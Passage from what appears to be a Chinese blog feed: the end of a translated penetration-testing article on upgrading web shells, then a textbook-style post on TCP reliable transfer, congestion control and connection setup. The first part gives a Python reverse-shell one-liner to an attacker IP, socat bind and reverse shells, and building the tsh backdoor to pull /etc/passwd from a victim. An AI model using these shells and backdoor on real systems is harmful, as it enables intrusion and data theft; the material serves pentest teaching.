<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># This script is called by proxychains to resolve DNS names</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS server used to resolve names</span></span><br><span class="line">DNS_SERVER=<span class="variable">$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125;</span>    <span class="comment">#change nameserver here</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> = 0 ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  usage:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;      proxyresolv &lt;hostname&gt; &quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h2 id="美化你的-web-shell"><a href="#美化你的-web-shell" class="headerlink" title="美化你的 web shell"></a>美化你的 web shell</h2><p>这部分内容与 pivoting 或 tunneling 没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用 web-shell 非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给 sudo/su 或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将 web-shell 升级到一个交互式 shell 时，我这样做:)我不会介绍像使用 bash/perl/python 等启动半交互式 shell。有很多关于这样做的信息。看看这个反向 shell 备忘单 - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 。</p>
<h3 id="Python-PTY-shell"><a href="#Python-PTY-shell" class="headerlink" title="Python PTY shell"></a>Python PTY shell</h3><p>从常规的半交互式 shell 升级。你可以在现有的 shell 中执行以下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>或者启动反向连接：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;\</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</span></span><br><span class="line"><span class="string">s.connect((&quot;&lt;attackers_ip&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><p>Netcat 的加强版！可是说实话，去检查这个<a href="http://www.dest-unreach.org/socat/">工具</a>的手册 <code>man socat</code>，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的 shell，甚至比前面提到的 python-pty 更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类 Unix 发行版中的默认工具。</p>
<h4 id="绑定-shell"><a href="#绑定-shell" class="headerlink" title="绑定 shell"></a>绑定 shell</h4><p>设置监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>

<p>连接到监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat FILE:`tty`,raw,<span class="built_in">echo</span>=0 TCP:&lt;victim_ip&gt;:1337</span><br></pre></td></tr></table></figure>

<h4 id="反向-shell"><a href="#反向-shell" class="headerlink" title="反向 shell"></a>反向 shell</h4><p>设置监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>

<p>连接到攻击者的机器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>

<h4 id="终端大小"><a href="#终端大小" class="headerlink" title="终端大小"></a>终端大小</h4><p>默认情况下，终端的大小是相当小的，当启动 <code>top</code> 命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用 <code>stty -a</code> 命令来获得你的常规终端的大小：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ stty -a</span><br><span class="line">speed 38400 baud; rows 57; columns 211; line = 0;</span><br></pre></td></tr></table></figure>

<p>将所需的尺寸应用到你的 socat 终端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">stty rows 57 cols 211</span><br></pre></td></tr></table></figure>

<h3 id="Tsh"><a href="#Tsh" class="headerlink" title="Tsh"></a>Tsh</h3><p><a href="https://github.com/creaktive/tsh">Tsh</a> 是一个小型的 ssh 式后门，带有完整的 pty 终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类 Unix 系统上编译。从编辑 tsh.h 文件开始：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">&quot;never say never say die&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 22</span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> server_port = SERVER_PORT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_HOST  &quot;localhost&quot;</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_DELAY 30</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure>

<p>更改 <code>secret</code>，指定 <code>SERVER_PORT</code>。如果你想反向连接，取消注释并编辑 <code>CONNECT_BACK_HOST</code> 和 <code>CONNECT_BACK_DELAY</code> 指令。运行 make：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make linux_x64</span><br><span class="line">make								\</span><br><span class="line">	LDFLAGS=<span class="string">&quot; -Xlinker --no-as-needed -lutil&quot;</span>	\</span><br><span class="line">	DEFS=<span class="string">&quot; -DLINUX&quot;</span>					\</span><br><span class="line">	tsh tshd</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/tmp/tsh&#x27;</span></span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c pel.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c aes.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c sha1.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c tsh.c</span><br><span class="line">gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o</span><br><span class="line">strip tsh</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c tshd.c</span><br><span class="line">gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o</span><br><span class="line">strip tshd</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/tmp/tsh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在在服务器上运行 <code>./tshd</code>。它将开始监听指定的端口。您可以通过执行以下命令连接到它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./tsh host_ip</span><br></pre></td></tr></table></figure>

<p>如果 tsh 被编译有反向连接功能，<code>tshd</code> 守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./tsh cb</span><br><span class="line">Waiting <span class="keyword">for</span> the server to connect...</span><br></pre></td></tr></table></figure>

<p>用 tsh 传输文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./tsh host_ip get /etc/passwd .</span><br><span class="line">./tsh host_ip put /bin/netcat /tmp</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>TCP 协议分析</title>
    <url>/2018/05/11/tcp/</url>
    <content><![CDATA[<p>TCP 全称 Transmission Control Protocol，即<strong>传输控制协议</strong>，它为调用它的应用程序提供了一种可靠的、<strong>面向连接</strong>（connection-oriented）的服务。</p>
<p>TCP 连接提供的是<strong>全双工服务</strong>（full-duplex service），TCP 连接也总是<strong>点对点</strong>（point-to-point）的。</p>
<p>相比 <a href="/2021/01/12/udp/" title="UDP">UDP</a>，TCP 主要多了 2 种服务：<strong>可靠数据传输</strong>（reliable data transfer）和<strong>拥塞控制</strong>（congestion control）。</p>
<span id="more"></span>

<h2 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h2><p>TCP 提供的可靠数据传输具体包含以下 3 点：</p>
<ul>
<li>分组中的比特不会受损（由 0 变为 1，或者相反），即不存在比特差错</li>
<li>分组中的比特不会丢失</li>
<li>所有数据都是按照其发送顺序进行交付</li>
</ul>
<h3 id="受损"><a href="#受损" class="headerlink" title="受损"></a>受损</h3><p>我们先假设分组中的比特不会丢失且顺序不会改变，在此来讨论如何保证比特不会受损：</p>
<p>在计算机网络环境中，基于<strong>肯定确认</strong>（positive acknowledgment，<strong>ACK</strong>）（“OK”）与<strong>否定确认</strong>（negative acknowledgment，<strong>NAK</strong>）（“请重复一遍”）这样的重传机制的可靠数据传输协议称为<strong>自动重传请求（Automatic Repeat reQuest，ARQ）协议</strong>。</p>
<p>ARQ 协议中还需要另外三种协议功能来处理存在比特差错的情况：</p>
<ul>
<li><strong>差错检测</strong>：需要一种机制以使接收方检测到何时出现了比特差错。类似于 UDP 的做法，通过检验和字段可以实现此功能。</li>
<li><strong>接收方反馈</strong>：发送方要了解接收方情况（此时为分组是否被正确接收）的唯一途径就是让接收方提供明确的反馈信息给发送方。</li>
<li><strong>重传</strong>：接收方收到有差错的分组时，发送方将重传该分组。</li>
</ul>
<p>当发送方处于等待 ACK 或 NAK 的状态时，它不能从上层获得更多的数据，因此，发送方将不会发送一块新数据，除非发送方确信接收方已正确接收当前分组。这样的协议被称为<strong>停等</strong>（stop-and-wait）协议。</p>
<p>除此之外，还需要考虑到 ACK 或 NAK 分组受损的可能性：当发送方收到含糊不清的 ACK 或 NAK 分组时，一个简单的解决方法是重传当前数据分组。然而，这种方法在发送方到接收方的信道中引入了<strong>冗余分组</strong>（duplicate packet）。冗余分组的根本困难在于接收方不知道它上次所发送的 ACK 或 NAK 是否被发送方正确地收到。因此它无法 <em>事先</em> 知道接收到的分组是新的还是一次重传！</p>
<p>解决这个新问题的一个简单方法是在数据分组中添加一新字段，让发送方对其数据分组编号，即将发送数据分组的<strong>序号</strong>（sequence number）放在该字段。于是，接收方只需要检查序号即可确定收到的分组是否是一次重传。</p>
<p>至此，我们介绍了保证比特不会受损用到的所有技术，由于引入了序号，还有一个可以优化的地方：如果不发送 NAK，而是对上次正确接收的分组发送一个 ACK，我们也能实现与 NAK 一样的效果。发送方接收到对同一个分组的两个 ACK（即接收<strong>冗余 ACK</strong>（duplicate ACK））后，就知道接收方没有正确接收到跟在被确认两次的分组后面的分组。</p>
<h3 id="丢失"><a href="#丢失" class="headerlink" title="丢失"></a>丢失</h3><p>仍然假设顺序不会改变，在保证比特不会受损之后，我们来讨论如何保证比特不会丢失：</p>
<p>要做到这一点，我们具体要解决两个问题：怎样检测丢包以及发生丢包后该做些什么，对于第二个问题，使用上文所介绍的所有技术即可解决，为解决第一个问题，还需增加一种新的协议机制。</p>
<p>发送方每次发送一个分组（包括第一次分组和重传分组）时，便启动一个<strong>倒计数定时器</strong>（countdown timer）；如果在定时器结束后仍未收到 ACK，则重传该分组。注意到如果一个分组经历了一个特别大的时延，发送方可能会重传该分组，即使该数据分组及其 ACK 都没有丢失。这就在发送方到接收方的信道中引入了<strong>冗余数据分组</strong>（duplicate data packet）的可能性。幸运的是，已经有足够的功能（即序号）来处理冗余分组情况。</p>
<h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><p>如果我们定义发送方（或信道）的<strong>利用率</strong>（utilization）为：发送方实际忙于将发送比特送进信道的那部分时间与发送时间之比，那么上文所述的停等协议有着非常低的发送方利用率，要解决此问题，就要允许发送方发送多个分组而无须等待确认。因为许多从 <em>发送方</em> 向 <em>接收方</em> 输送的分组可以被看成是填充到一条流水线中，故这种技术被称为<strong>流水线</strong>（pipelining）。</p>
<p>流水线技术对可靠数据传输协议可带来如下影响：</p>
<ul>
<li>必须增加序号范围，因为每个输送中的分组（不计算重传的）必须有一个唯一的序号，而且也许有多个在输送中的未确认报文。</li>
<li>协议的发送方和接收方两端也许不得不缓存多个分组。发送方最低限度应当能缓冲那些已发送但没有确认的分组。接收方或许也需要缓存那些已正确接收的分组。</li>
</ul>
<p>具体而言，所需序号范围和对缓冲的要求取决于数据传输协议如何处理丢失、损坏及延时过大的分组。解决流水线的差错恢复有两种基本方法是：</p>
<ul>
<li>回退 N 步（Go-Back-N，GBN）</li>
<li>选择重传（Selective Repeat，SR）</li>
</ul>
<h4 id="回退-N-步"><a href="#回退-N-步" class="headerlink" title="回退 N 步"></a>回退 N 步</h4><p>在<strong>回退 N 步（GBN）协议</strong>中，允许发送方发送多个分组（当有多个分组可用时）而不需等待确认，但它也受限于在流水线中未确认的分组数不能超过某个最大允许数 N。</p>
<p>下图显示了发送方看到的 GBN 协议的序号范围。如果我们将<strong>基序号（base）</strong>定义为最早未确认分组的序号，将<strong>下一个序号（nextseqnum）</strong>定义为最小的未使用序号（即下一个待发的序号），则可将序号范围分割成 4 段：</p>
<ul>
<li><code>[0, base-1]</code> 段内的序号对应于已经发送并被确认的分组；</li>
<li><code>[base, nextseqnum-1]</code> 段内对应已经发送但未被确认的分组；</li>
<li><code>[nextseqnum, base+N-1]</code> 段内的序号能用于那些要被立即发送的分组，如果有数据来自上层的话；</li>
<li>大于或等于 <code>base+N</code> 的序号是不能使用的，直到当前流水线中未被确认的分组（特别是序号为 <code>base</code> 的分组）已得到确认为止。</li>
</ul>
<p><img src="/images/gbn-sender-seqnum.jpg" alt="gbn sender seqnum"></p>
<p>如上图所示，那些已被发送但还未被确认的分组的许可序号范围可以被看成是一个在序号范围内长度为 N 的窗口。随着协议的运行，该窗口在序号空间向前滑动。因此，N 常被称为<strong>窗口长度</strong>（window size），GBN 协议也常被称为<strong>滑动窗口协议</strong>（sliding-window protocol）。</p>
<p>之所以要限制这些被发送的、未被确认的分组的数目为 N，是因为要实现后续介绍的流量控制。</p>
<p>GBN 发送方必须响应三种类型的事件：</p>
<ul>
<li><em>上层的调用。</em> 当上层调用时，发送方首先检查发送窗口是否已满，即是否有 N 个已发送但未被确认的分组。如果窗口未满，则产生一个分组并将其发送，并相应地更新变量。如果窗口已满，发送方只需将数据返回给上层，隐式地指示上层该窗口已满。然后上层可能会过一会儿再试。在实际实现中，发送方更可能缓存（并不立刻发送）这些数据，或者使用同步机制（如一个信号量或标志）允许上层在仅当窗口不满时才调用。</li>
<li><em>收到一个 ACK。</em> 在 GBN 协议中，对序号为 n 的分组的确认采用<strong>累计确认</strong>（cumulative acknowledgment）的方式，表示接收方已正确接收到序号为 n 的以前且包括 n 在内的所有分组。</li>
<li><em>超时事件。</em> 协议的名字“回退 N 步”来源于出现丢失和时延过长分组时发送方的行为。如果出现超时，发送方重传所有已发送但还未被确认过的分组。</li>
</ul>
<p>对 GBN 接收方而言，如果一个序号为 <code>n</code> 的分组被正确接收到，并且按序（即上次交付给上层的数据是序号为 <code>n-1</code> 的分组），则接收方为分组 <code>n</code> 发送一个 ACK，并将该分组中的数据部分交付到上层。在所有其他情况下，接收方丢弃该分组，并为最近按序接收的分组重新发送 ACK。</p>
<p>这种方法的优点是接收缓存简单，即接收方不需要缓存任何失序分组。因此，虽然发送方必须维护窗口的上下边界及 <code>nextseqnum</code> 在该窗口中的位置，但是接收方需要维护的唯一信息就是下一个按序接收的分组的序号。该值保存在 <code>expectedseqnum</code> 变量中。</p>
<h4 id="选择重传"><a href="#选择重传" class="headerlink" title="选择重传"></a>选择重传</h4><p>当窗口长度和带宽时延积都很大时，GBN 会存在着一些性能问题，在流水线中会有很多分组更是如此。单个分组的差错就能够引起 GBN 重传大量分组，许多分组根本没有必要重传。随着信道差错率的增加，流水线可能会被这些不必要重传的分组所充斥。</p>
<p>顾名思义，<strong>选择重传（SR）协议</strong>通过让发送方仅重传那些它怀疑在接收方出错（即丢失或受损）的分组而避免了不必要的重传。这种个别的、按需的重传要求接收方 <em>逐个</em> 地确认正确接收的分组。再次用窗口长度 N 来限制流水线中未完成、未被确认的分组数。然而，与 GBN 不同的是，发送方已经收到了对窗口中某些分组的 ACK。下图显示了 SR 发送方和接收方看到的序号范围：</p>
<p><img src="/images/sr-sender-receiver-seqnum.jpg" alt="sr sender receiver seqnum"></p>
<p>SR 接收方将确认一个正确的分组而不管其是否按序。失序的分组将被缓存直到所有丢失分组（即序号更小的分组）皆被收到为止，这时才可以将一批分组按序交付给上层。</p>
<p>对 SR 发送方而言：</p>
<ol>
<li><em>从上层收到数据。</em> 当从上层接收到数据后，SR 发送方检查下一个可用于该分组的序号。如果序号位于发送方的窗口内，则将数据打包并发送；否则就像在 GBN 中一样，要么将数据缓存，要么将其返回给上层以便以后传输。</li>
<li><em>超时。</em> 定时器再次被用来防止丢失分组。然而，现在每个分组必须拥有其自己的逻辑定时器，因为超时发生后只能发送一个分组。</li>
<li><em>收到 ACK。</em> 如果收到 ACK，倘若该分组序号在窗口内，则 SR 发送方将那个被确认的分组标记为已接收。如果该分组的序号等于 <code>send_base</code>，则窗口基序号向前移动到具有最小序号的未确认分组处。如果窗口移动了并且有序号落在窗口内的未发送分组，则发送这些分组。</li>
</ol>
<p>对 SR 接收方而言：</p>
<ol>
<li><em>序号在 <code>[rcv_base, rcv_base+N-1]</code> 内的分组被正确接收。</em>在此情况下，收到的分组落在接收方的窗口内，一个选择 ACK 被回送给发送方。如果该分组以前没收到过，则缓存该分组。如果该分组的序号等于接收窗口的基序号（<code>rcv_base</code>），则该分组以及以前缓存的序号连续的（起始于 <code>rcv_base</code> 的）分组交付给上层。然后，接收窗口按向前移动分组的编号向上交付这些分组。</li>
<li><em>序号在 <code>[rcv_base-N, rcv_base-1]</code> 内的分组被正确收到。</em>在此情况下，必须产生一个 ACK，即使该分组是接收方以前已确认过的分组。</li>
<li><em>其他情况。</em> 忽略该分组。</li>
</ol>
<p><strong>注意</strong>：当窗口长度比序号空间小 1 时协议无法工作。对于 SR 协议而言，窗口长度必须小于或等于序号空间大小的一半。</p>
<p>总结上文，为了实现可靠数据传输，我们需要使用以下技术：</p>
<ul>
<li>检验和</li>
<li>肯定确认，即 ACK 分组</li>
<li>重传</li>
<li>序号</li>
<li>定时器</li>
<li>窗口、流水线</li>
</ul>
<h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><p>在最为宽泛的级别上，可根据网络层是否为运输层拥塞控制提供了显式帮助，来将拥塞控制方法分为两类：</p>
<ul>
<li><strong>端到端拥塞控制</strong>：网络层 <em>没有</em> 为运输层拥塞控制提供 <em>显式支持</em>。即使网络中存在拥塞，端系统也必须通过对网络行为的观察（如分组丢失与时延）来推断之。</li>
<li><strong>网络辅助的拥塞控制</strong>：路由器向发送方提供关于网络中拥塞状态的显式反馈信息。这种反馈可以简单地用一个比特来指示链路中的拥塞情况。</li>
</ul>
<p>TCP 采用端到端的方法解决拥塞控制，因为 IP 层不会向端系统提供有关网络拥塞的反馈信息。</p>
<p>对于网络辅助的拥塞控制，拥塞信息从网络反馈到发送方通常有两种方式：</p>
<ul>
<li><strong>直接网络反馈</strong>：可以由网络路由器发给发送方。这种方式的通知通常采用了一种<strong>阻塞分组</strong>（choke packet）的形式。</li>
<li><strong>经由接收方的网络反馈</strong>：路由器标记或更新从发送方流向接收方的分组中的某个字段来指示拥塞的产生。一旦收到一个标记的分组后，接收方就会向发送方通知该网络拥塞指示。注意到这种形式的通知至少要经过一个完整的往返时间。</li>
</ul>
<p>TCP 所采用的方法是让每一个发送方根据所感知的网络拥塞程度来限制其能向连接发送流量的速率。如果一个 TCP 发送方感知从它到目的地之间的路径上没什么拥塞，则 TCP 发送方增加其发送速率；如果发送方感知沿着该路径有拥塞，则发送方就会降低其发送速率。这就会涉及到 3 个方面：</p>
<ul>
<li>如何限制速率</li>
<li>如何感知拥塞</li>
<li>采用何种拥塞控制算法</li>
</ul>
<h3 id="限制速率"><a href="#限制速率" class="headerlink" title="限制速率"></a>限制速率</h3><p>运行在发送方的 TCP 拥塞控制机制跟踪一个额外的变量，即<strong>拥塞窗口</strong>（congestion window）。拥塞窗口表示为 cwnd，它对一个 TCP 发送方能向网络中发送流量的速率进行了限制。</p>
<h3 id="感知拥塞"><a href="#感知拥塞" class="headerlink" title="感知拥塞"></a>感知拥塞</h3><p>当出现过度的拥塞时，在沿着这条路径上的一台（或多台）路由器的缓存会溢出，引起一个数据报（包含一个 TCP 报文段）被丢弃。丢弃的数据报接着会引起发送方的丢包事件（要么超时或收到 3 个冗余 ACK），发送方就认为在发送方到接收方的路径上出现了拥塞的指示。</p>
<h3 id="拥塞控制算法"><a href="#拥塞控制算法" class="headerlink" title="拥塞控制算法"></a>拥塞控制算法</h3><p>迄今为止，TCP 有各种各样的<strong>拥塞控制算法</strong>（congestion control algorithm），我们以广为人熟知的 Reno 算法介绍，其包括 3 个主要部分：</p>
<ul>
<li>慢启动</li>
<li>拥塞避免</li>
<li>快速恢复</li>
</ul>
<p>慢启动和拥塞避免是 TCP 的强制部分，两者的差异在于对收到的 ACK 做出反映时增加 cwnd 长度的方式，慢启动比拥塞避免能更快地增加 cwnd 的长度。快速恢复是推荐部分，对 TCP 发送方并非是必需的。</p>
<h4 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h4><p>在<strong>慢启动</strong>（slow-start）状态，cwnd 的值以 1 个 MSS 开始并且每当传输的报文段首次被确认就增加 1 个 MSS。</p>
<p>例如，TCP 向网络发送第一个报文段并等待一个确认；当该确认到达时，TCP 发送方将拥塞窗口增加 1 个 MSS，并发送出两个最大长度的报文段；这两个报文段被确认，则发送方对每个确认报文段将拥塞窗口增加 1 个 MSS，使得拥塞窗口变为 4 个 MSS，并这样下去。这一过程每过一个 RTT，发送速度就翻番。因此，TCP 发送速率起始慢，但在慢启动阶段以指数增长。</p>
<p>这种指数增长不是无限的，慢启动在遇到以下 3 种情况之一时将结束：</p>
<ul>
<li>若存在一个由超时指示的丢包事件（即拥塞），TCP 发送方将另一个状态变量 ssthresh（“慢启动阈值”的速记）设为 cwnd/2，再将 cwnd 设为 1 并重新开始慢启动过程。</li>
<li>当 cwnd 的值等于 ssthresh 时，结束慢启动并且 TCP 转移到拥塞避免模式。</li>
<li>若检测到 3 个冗余 ACK，这时 TCP 执行一种快速重传并进入快速恢复状态。</li>
</ul>
<h4 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h4><p>一旦进入拥塞避免状态，cwnd 的值大约是上次遇到拥塞时的值的一半，即距离拥塞可能并不遥远！因此，TCP 无法每过一个 RTT 再将 cwnd 的值翻番，而是采用了一种较为保守的方法，每个 RTT 只将 cwnd 的值增加一个 MSS。</p>
<h4 id="快速恢复"><a href="#快速恢复" class="headerlink" title="快速恢复"></a>快速恢复</h4><p>在快速恢复中，对于引起 TCP 进入快速恢复状态的缺失报文段，对收到的每个冗余的 ACK，cwnd 的值增加一个 MSS。</p>
<h2 id="TCP-报文段结构"><a href="#TCP-报文段结构" class="headerlink" title="TCP 报文段结构"></a>TCP 报文段结构</h2><p>TCP 报文段大致分为<strong>首部字段</strong>和<strong>数据字段</strong>两部分，数据字段包含一块应用数据，首部字段一般是 20 字节，数据字段最大长度为 MSS。下图显示了 TCP 报文段结构：</p>
<p><img src="/images/tcp.PNG" alt="TCP 报文段结构"></p>
<p>同 UDP 一样，首部包括<strong>源端口号</strong>、<strong>目的端口号</strong>以及<strong>检验和字段（checksum field）</strong>。除此之外，还包含以下字段：</p>
<ul>
<li>32 比特的<strong>序号字段</strong>（sequence number field）和 32 比特的<strong>确认号字段</strong>（acknowledgment number field）：这些字段被 TCP 发送方和接收方用来实现可靠数据传输服务。</li>
<li>16 比特的<strong>接收窗口字段</strong>（receive window field）：该字段用于流量控制，用于指示接收方愿意接受的字节数量。</li>
<li>4 比特的<strong>首部长度字段</strong>（header length field）：该字段指示了以 32 比特的字为单位的 TCP 首部长度。由于 TCP 选项字段的原因，TCP 首部的长度是可变的。通常，选项字段为空，所以 TCP 首部的典型长度是 20 字节。</li>
<li>可选与变长的<strong>选项字段</strong>（options field）：该字段用于发送方与接收方协商最大报文段长度（MSS）时，或在高速网络环境下用作窗口调节因子时使用。首部字段中还定义了一个时间戳选项。</li>
<li>6 比特的<strong>标志字段</strong>（flag field）：<strong>ACK</strong> 比特用于指示确认字段中的值是有效的，即该报文段包括一个对已被成功接收报文段的确认。<strong>RST</strong>、<strong>SYN</strong> 和 <strong>FIN</strong> 比特用于连接建立和拆除。在明确拥塞通告中使用了 <strong>CWR</strong> 和 <strong>ECE</strong> 比特。当 <strong>PSH</strong> 比特被置位时，就指示接收方应立即将数据交给上层。最后，<strong>URG</strong> 比特用来指示报文段里存在着被发送端的上层实体置为“紧急”的数据。紧急数据的最后一个字节由 16 比特的<strong>紧急数据指针字段</strong>（urgent data pointer field）指出。</li>
</ul>
<p>MSS 全称 Maximum Segment Size，即<strong>最大报文段长度</strong>，指 TCP 可从缓存中取出并放入报文段中的数据的最大数量。MSS 通常根据最初确定的由本地发送主机发送的最大链路层帧长度（即所谓的<strong>最大传输单元</strong>（Maximum Transmission Unit，MTU））来设置。设置该 MSS 要保证一个 TCP 报文段（当封装在一个 IP 数据报中）加上 TCP/IP 首部长度（通常 40 字节）将适合单个链路层帧。以太网和 PPP 链路层协议都具有 1500 字节的 MTU，因此 MSS 的典型值为 1460 字节。</p>
<h2 id="TCP-连接与状态"><a href="#TCP-连接与状态" class="headerlink" title="TCP 连接与状态"></a>TCP 连接与状态</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>客户端 TCP 会用以下方式与服务器端 TCP 建立一条 TCP 连接：</p>
<ol>
<li>客户端 TCP 首先向服务器端 TCP 发送一个 <strong>SYN 报文段</strong>。<br>该报文段不包含应用层数据，但是报文段的首部中的 SYN 标志位被置为 1，序号字段为一个随机的初始序号（不妨设为 <code>client_isn</code>）。<br>客户端 TCP 初始为 <strong>CLOSED</strong>（关闭）状态，发送此 SYN 报文段后，将进入 <strong>SYN_SENT</strong> 状态。</li>
<li>服务器端 TCP 收到 SYN 报文段后，会为该 TCP 连接分配 TCP 缓存和变量，并向客户端 TCP 发送一个 <strong>SYNACK 报文段</strong>。<br>该报文段也不包含应用层数据，但是报文段的首部中的 SYN 标志位被置为 1，确认号字段为 <code>client_isn + 1</code>，序号字段为一个随机的初始序号（不妨设为 <code>server_isn</code>）。<br>服务器端 TCP 初始为 CLOSED 状态，当服务器应用程序创建一个监听套接字时，将进入 <strong>LISTEN</strong> 状态，发送此 SYNACK 报文段后，将进入 <strong>SYN_RCVD</strong> 状态。</li>
<li>客户端 TCP 收到 SYNACK 报文段后，也会为该 TCP 连接分配 TCP 缓存和变量，并向服务器端 TCP 发送一个 <strong>ACK 报文段</strong>。<br>该报文段的首部中的 SYN 标志位被置为 0，确认号字段为 <code>server_isn + 1</code>，可以携带应用层数据。<br>发送此 ACK 报文段后，客户端 TCP 将进入 <strong>ESTABLISHED</strong>（已建立）状态，服务器端 TCP 收到 ACK 报文段后也将进入 ESTABLISHED 状态。</li>
</ol>
<p>一旦完成以上 3 个步骤，客户和服务器主机就可以相互发送包括数据的报文段了。在以后每一个报文段中，SYN 比特都将被置为 0。为了创建该连接，在两台主机之间发送了 3 个分组，由于这个原因，这种连接创建过程通常被称为 <strong>3 次握手</strong>（three-way handshake）。</p>
<h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><p>参与一条 TCP 连接的两个进程中的任何一个都能终止该连接。当连接结束后，主机中的“资源”（即缓存和变量）将被释放。假设客户端打算关闭连接，它将遵循以下步骤：</p>
<ol>
<li>客户端 TCP 向服务器端 TCP 发送一个 <strong>FIN 报文段</strong>。<br>该报文段的首部中的 FIN 标志位被置为 1。<br>发送此 FIN 报文段后，客户端 TCP 将从 ESTABLISHED 状态进入到 <strong>FIN_WAIT_1</strong> 状态。</li>
<li>服务器端 TCP 收到 FIN 报文段后，会向客户端 TCP 发送一个 <strong>ACK 报文段</strong>。<br>发送此 ACK 报文段后，服务器端 TCP 将从 ESTABLISHED 状态进入到 <strong>CLOSE_WAIT</strong> 状态，客户端 TCP 收到 ACK 报文段后将进入 <strong>FIN_WAIT_2</strong> 状态。</li>
<li>服务器端 TCP 向客户端 TCP 发送一个 <strong>FIN 报文段</strong>。<br>发送此 FIN 报文段后，服务器端 TCP 将进入 <strong>LAST_ACK</strong> 状态。</li>
